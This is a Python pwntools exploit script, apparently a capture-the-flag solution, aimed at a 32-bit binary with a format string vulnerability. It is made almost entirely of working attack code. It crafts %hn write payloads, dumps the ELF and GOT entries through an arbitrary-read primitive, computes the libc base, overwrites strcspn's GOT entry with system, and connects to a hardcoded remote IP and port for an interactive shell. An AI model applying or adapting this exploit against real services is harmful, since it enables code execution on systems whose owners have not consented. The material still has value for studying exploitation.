#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("131.114.59.19", 9999, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#input starts at %11$p
#The stack address in position 7 points to the stack address in position 73
elf_start = 0x8048000

io = start()

def write_addr(target_addr, pos_addr, oneshot=False):

    pos_bytes = pos_addr.to_bytes(4, "little")
    pos_bytes_trasl = (pos_addr+2).to_bytes(4, "little")

    lower_addr_val = target_addr%(2**16)
    upper_addr_val = target_addr//(2**16)

    if(oneshot):

        min_len = len(pos_bytes) + len(pos_bytes_trasl)
        first_inc_counter = 2**16 - min_len + lower_addr_val
        second_inc_counter = 2**16 - first_inc_counter % 2**16 - min_len + upper_addr_val
        formula = f"%{first_inc_counter}x%11$hn%{second_inc_counter}x%12$hn"
        payload = pos_bytes + pos_bytes_trasl + bytes(formula, "ascii")

        io.sendline(payload)

    else:
        io.sendline(pos_bytes + bytes(f"%11${2**16-len(pos_bytes)+lower_addr_val}x%11$hn", "ascii"))
        io.sendline(pos_bytes_trasl + bytes(f"%11${2**16-len(pos_bytes)+upper_addr_val}x%11$hn", "ascii"))

def leak_data(start_addr, length):

    elf_array = []
    cur_elf = start_addr
    inc_addr = 0
    bytes_count = 0

    io.sendline(b"AAAA_%7$x")
    io.recvuntil(b"AAAA_")
    pointer_addr = int(io.recvuntil(b"!\nArgh", True), 16)

    while(bytes_count < length):
        cur_elf = cur_elf + inc_addr
        write_addr(cur_elf, pointer_addr)

        io.sendline(b"AAAA_%73$s")
        io.recvuntil(b"AAAA_")
        content = io.recvuntil(b"!\nArgh", True)
        inc_addr = len(content)

        if(len(content) != 0):
            if(bytes_count + len(content) > length):
                content = content[0:length-bytes_count]
                inc_addr = len(content)

            elf_array.append(content)
        else:
            inc_addr = 1
            elf_array.append(b"\x00")

        bytes_count += inc_addr
#        print(elf_array)
#        print(bytes_count)

    return b"".join(elf_array)

#DONE
#elf_dump = leak_data(elf_start, 4000)

#with open("elf_dump", "wb") as dump:
#    dump.write(elf_dump)


#Used ./rebuild_elf_sections.py
exe = ELF("./elf")

addr_printf = int.from_bytes(leak_data(exe.sym.got.printf, 4), "little")
addr_puts = int.from_bytes(leak_data(exe.sym.got.puts, 4), "little")
addr_strcspn = int.from_bytes(leak_data(exe.sym.got.strcspn, 4), "little")
addr_setbuf = int.from_bytes(leak_data(exe.sym.got.setbuf, 4), "little")
addr_fgets = int.from_bytes(leak_data(exe.sym.got.fgets, 4), "little")

print("printf:%x"%addr_printf)
print("puts:%x"%addr_puts)
print("strcspn:%x"%addr_strcspn) #Unico indirizzo che non corrisponde alla libc
print("setbuf:%x"%addr_setbuf)
print("fgets:%x"%addr_fgets)

#Leaked libc with blukat
libc = ELF("./libc6-i386_2.27-3ubuntu1_amd64.so")

libc.address = addr_printf - libc.sym.printf
str_bin_sh = libc.address + 0x17b8cf #Correct
exit_loop_addr = 0x080485f2
main_addr = 0x8048586

write_addr(libc.sym.system, exe.sym.got.strcspn, True)

io.interactive()
